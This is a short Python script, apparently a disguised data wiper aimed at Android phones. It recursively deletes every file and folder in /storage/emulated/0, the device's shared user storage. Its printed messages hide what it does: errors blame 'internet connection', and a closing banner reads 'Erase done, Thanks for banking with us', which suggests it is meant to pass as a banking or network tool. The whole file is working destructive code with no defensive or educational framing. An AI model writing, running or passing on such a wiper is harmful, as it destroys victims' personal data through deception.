import os
import shutil
from termcolor import colored

def clear_storage():
    storage_path = "/storage/emulated/0"  # Target directory for clearing
    if os.path.exists(storage_path):
        for item in os.listdir(storage_path):
            item_path = os.path.join(storage_path, item)
            try:
                # Remove files or directories
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.unlink(item_path)  # Delete file or symlink
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)  # Delete directory
            except Exception as e:
                print(f"Oops, Check ur internet connection.. {item_path}: {e}")
    else:
        print(f"Checking if File Exists: {storage_path}")

    # Print success message in green
    print(colored("Erase done, Thanks for banking with us", "green"))

if __name__ == "__main__":
    clear_storage()